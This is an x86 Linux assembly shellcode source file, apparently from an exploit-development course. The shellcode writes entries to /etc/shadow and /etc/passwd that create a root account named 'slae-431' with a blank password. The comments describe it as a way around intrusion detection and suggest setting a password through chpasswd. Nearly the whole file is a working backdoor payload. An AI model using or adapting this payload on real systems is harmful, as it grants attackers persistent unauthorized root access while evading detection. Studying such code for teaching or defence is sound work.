; Filename: accounter.nasm
; Author: Gitsnik
; Website:  http://dracyrys.com
;
; Shellcode is 120 bytes (including exit at the end).
;
; Purpose:
;
;	Create a user on the system with a blank username
;	and password who is a root user.
;
;	This will create the user in both /etc/shadow and
;	/etc/passwd. No point in not being clean about it.
;
; Notes:
;
;	Most modern operating system programs won't accept
;	this account as valid until you set a password.
;
;	Either write in the crypt/md5 and push it as part
;	of the file writes below, or fire an execve at the
;	end of the code that will do something like:
;
;	echo "slae-431:roflcopter" | chpasswd
;
;	This shellcode is on the larger side. Not for the
;	faint of heart.
;
; Clarification:
;
;	1. Yes, if you can execve you can just build up a
;		/bin/sh shell. Flying shells get caught
;		and killed by most IDS', so this may be
;		one way around it.
;	2. I've written this as a practical example of
;		writing as much data as you like to pretty
;		much any file you can get access to.
;

global _start			

section .text
_start:

	xor eax, eax
	xor ecx, ecx
	cdq

	push byte 0x02
	pop esi

	push eax		; Null terminated.

				; /etc/shadow
	push 0x776f6461		; woda : 776f6461
	push 0x68732f2f		; hs// : 68732f2f
	jmp writer

passwd:
	xor eax, eax
	xor ecx, ecx
	cdq

	push byte 0x01
	pop esi

	push eax		; Null terminated.

	push 0x64777373		; dwss : 64777373
	push 0x61702f2f		; ap// : 61702f2f

writer:

	push 0x6374652f		; cte/ : 6374652f no point doing it twice in code.
	add eax, 0x05		; open syscall (5)
	mov ebx, esp		; ebx is about to point to...
	mov cx, 0x0442		; create flags
	mov dx, 0x01FF		; chmod flags (755)
	int 0x80

	xchg eax, ebx		; store file handle in ebx because it
				; is the first argument to write()
				; anyway so we might as well!

	xor eax, eax
	add eax, 0x04		; write syscall
	xor cx, 0x0448		; 0x0442 xor 0x0448 = 0x000a. The
				; alternative is to clear a register
				; and do the math on it to make our
				; newline. Urgh. ECX already has most
				; of what we want.
	push ecx

				; slae-431::0:0:::
	push 0x3a3a3a30		; :::0 : 3a3a3a30
	push 0x3a303a3a		; :0:: : 3a303a3a
	push 0x3133342d		; 134- : 3133342d
	push 0x65616c73		; eals : 65616c73

	mov ecx, esp
	xor dx, 0x01EE		; 0x01FF xor 0x01EE = 0x0011 (17). DX
				; already contains the flags from
				; chmod.
	int 0x80

	; Close file handle. EBX already holds file descriptor.
	mov eax, 0x06
	int 0x80

	cmp esi, 0x01
	jne passwd

	; Exit
	xor eax, eax
	xor ebx, ebx
	inc eax
	int 0x80
